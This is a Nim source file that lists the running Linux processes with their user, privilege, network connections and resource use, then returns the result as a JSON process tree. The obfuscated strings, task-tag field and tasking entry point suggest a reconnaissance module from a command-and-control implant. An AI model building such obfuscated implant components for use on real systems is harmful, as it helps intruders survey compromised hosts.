import std/[json, math, strutils, tables]
import ../utils/global
import ../utils/linapi/handlers
import execution

proc snapshotProcesses(): seq[JsonNode] =
  # Reads running processes and builds a JSON list
  let uptime = getProcUptime()
  let ncpu = max(1, getCpuCount())
  let clk = max(1'i64, getClockTicks()).float
  let tcpMap = getTcpPidMap()
  let sysArch = formatProcessArch()

  for pid in listProcessIds():
    if pid <= 0:
      continue
    try:
      let st = readProcessStat(pid)
      if st.pid <= 0:
        continue
      let status = readProcessStatus(pid)
      let priv = formatProcessPrivilege(status.uid)
      let name =
        if status.name.len > 0: status.name
        elif st.comm.len > 0: st.comm
        else: obf("?")
      let path = readProcessExePath(pid)
      let procTime = (st.utime + st.stime).float / clk
      let cpu =
        if uptime > 0:
          round(min(100.0, procTime / (uptime * ncpu.float) * 100.0) * 10.0) / 10.0
        else:
          0.0
      let memory =
        if status.vmRssKb > 0:
          round(status.vmRssKb.float / 1024.0 * 10.0) / 10.0
        else:
          0.0

      result.add(%*{
        obf("pid"): pid,
        obf("ppid"): st.ppid,
        obf("name"): name,
        obf("path"): path,
        obf("user"): formatProcessUser(status.uid),
        obf("integrity"): priv.integrity,
        obf("session"): st.session,
        obf("arch"): sysArch,
        obf("network"): if tcpMap.hasKey(pid): tcpMap[pid] else: obf(""),
        obf("privilege"): priv.privilege,
        obf("cpu"): cpu,
        obf("memory"): memory,
      })
    except CatchableError:
      discard

proc buildTree(procs: seq[JsonNode]): JsonNode =
  # Builds the process tree from the snapshot
  var pidIdx = initTable[uint32, int]()
  for i, p in procs:
    pidIdx[uint32(p[obf("pid")].getInt())] = i

  var childOf = initTable[int, seq[int]]()
  var isChild = newSeq[bool](procs.len)

  for i, p in procs:
    let pid = uint32(p[obf("pid")].getInt())
    let ppid = uint32(p[obf("ppid")].getInt())
    if ppid != 0 and ppid != pid and pidIdx.hasKey(ppid):
      let par = pidIdx[ppid]
      if not childOf.hasKey(par):
        childOf[par] = @[]
      childOf[par].add(i)
      isChild[i] = true

  proc toJson(idx: int): JsonNode =
    # Builds one tree node and its children
    let p = procs[idx]
    result = %*{
      obf("pid"): p[obf("pid")],
      obf("name"): p[obf("name")],
      obf("path"): p[obf("path")],
      obf("cpu"): p[obf("cpu")],
      obf("memory"): p[obf("memory")],
      obf("user"): p[obf("user")],
      obf("integrity"): p[obf("integrity")],
      obf("session"): p[obf("session")],
      obf("arch"): p[obf("arch")],
      obf("network"): p[obf("network")],
      obf("privilege"): p[obf("privilege")],
    }
    if childOf.hasKey(idx) and childOf[idx].len > 0:
      var arr = newJArray()
      for c in childOf[idx]:
        arr.add(toJson(c))
      result[obf("children")] = arr

  var tree = newJArray()
  for i in 0 ..< procs.len:
    if not isChild[i]:
      tree.add(toJson(i))
  tree

proc run*(host, taskTag, input, params: string; buf: var openArray[char]): int =
  # Entrypoint of the process route
  try:
    let tree = buildTree(snapshotProcesses())
    writeMsg($( %*{
      obf("option"): obf("output"),
      obf("type"): obf("process"),
      obf("host"): host,
      obf("task_tag"): taskTag,
      obf("tree"): $tree,
    }), buf)
  except CatchableError as e:
    writeMsg($( %*{
      obf("option"): obf("output"),
      obf("type"): obf("process"),
      obf("host"): host,
      obf("task_tag"): taskTag,
      obf("error"): e.msg,
    }), buf)
